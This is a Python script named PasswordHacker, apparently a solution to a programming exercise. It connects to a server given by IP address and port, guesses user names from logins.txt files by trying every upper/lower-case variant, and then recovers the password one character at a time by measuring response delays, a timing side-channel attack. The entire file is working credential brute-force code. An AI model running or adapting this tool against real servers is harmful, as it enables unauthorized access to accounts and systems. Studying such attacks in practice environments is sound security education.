import itertools
import json
import os
import time
import socket
import string
import sys


class PasswordHacker:
    def __init__(self, ip_address: str, port: int, buffer_size: int =1024):
        """
        Password hacker that connects to a specified IP address and port
        :param ip_address: str - IP address for the target server
        :param port: int - Port number for the target server
        :param buffer_size: int - Buffer size for our connection
        """
        self.socket = socket.socket()
        self.address = (ip_address, port)
        self.recv_message = ""
        self.buffer_size = buffer_size
        self.login_dict = {"login": "",
                           "password": "123"}
        self.login_files = []
        self.base_exception_time = 0

    @property
    def __repr__(self):
        return f"Connection: {self.address[0]}:{self.address[1]}"

    def send_and_receive(self):
        self.get_files()
        self.socket.connect(self.address)
        self.find_base_exception_timer()
        self.find_login()
        self.find_password()
        self.socket.close()
        self.print_login_information()

    def get_files(self):
        """
        Walks through the current directory looking for any files called "logins.txt" and saves the path.
        :return:
        """
        for root, dirs, files in os.walk(os.curdir):
            for file in files:
                if file == "logins.txt":
                    self.login_files.append(os.path.join(root, file))

    def find_base_exception_timer(self):
        """
        Try to authenticate with a garbage password to find out how long it takes for the server to normally fail to
        authenticate.
        :return:
        """
        login_json = json.dumps(self.login_dict).encode()
        start = time.time()
        self.socket.send(login_json)
        self.recv_message = json.loads(self.socket.recv(self.buffer_size).decode())
        end = time.time()
        self.base_exception_time = start - end

    def find_login(self):
        """
        Iterate through our login files and try combinations with upper and lower case letters. If we get a message
        indicating an incorrect password, we know we have the login.
        :return:
        """
        for login_file in self.login_files:
            with open(login_file, "r") as lf:
                for login in lf:
                    login = login.rstrip()
                    # Take each letter in login and create a tuple of the upper and lower version of the letter
                    # Unpack and pass into itertools.product to give every possible combination of upper and lower,
                    # Then join across the entire result to give us an object containing all possible results.
                    # Convert to a list for easier iterable support.
                    # Example for login = test
                    # login_combinations = ['TEST', 'tEST', ..., 'test']
                    login_combinations = list(map(''.join,
                                                  itertools.product(
                                                      *({letter.upper(), letter.lower()} for letter in login))))
                    for lc in login_combinations:
                        self.login_dict["login"] = lc
                        login_json = json.dumps(self.login_dict).encode()
                        self.socket.send(login_json)
                        self.recv_message = json.loads(self.socket.recv(self.buffer_size).decode())
                        if self.recv_message["result"] == "Wrong password!":
                            return

    def find_password(self):
        """
        Brute force the password by constructing against valid characters and looking for rapid returns indicating a
        correct character.
        :return:
        """
        valid_characters = string.ascii_letters + string.digits
        password_search = True
        known_password = ""
        while password_search:
            for character in valid_characters:
                self.login_dict["password"] = known_password + character
                login_json = json.dumps(self.login_dict).encode()
                start = time.time()
                self.socket.send(login_json)
                self.recv_message = json.loads(self.socket.recv(self.buffer_size).decode())
                end = time.time()
                message_duration = start - end
                if self.recv_message["result"] == "Wrong password!":
                    if abs(message_duration - self.base_exception_time) > 0.001:
                        known_password = self.login_dict["password"]
                        break
                elif self.recv_message["result"] == "Connection success!":
                    return
                elif self.recv_message["result"] == "Bad request!":
                    return

    def print_login_information(self):
        print(json.dumps(self.login_dict))


args = sys.argv
if len(args) == 3:
    ph = PasswordHacker(args[1], int(args[2]), 1024)
    ph.send_and_receive()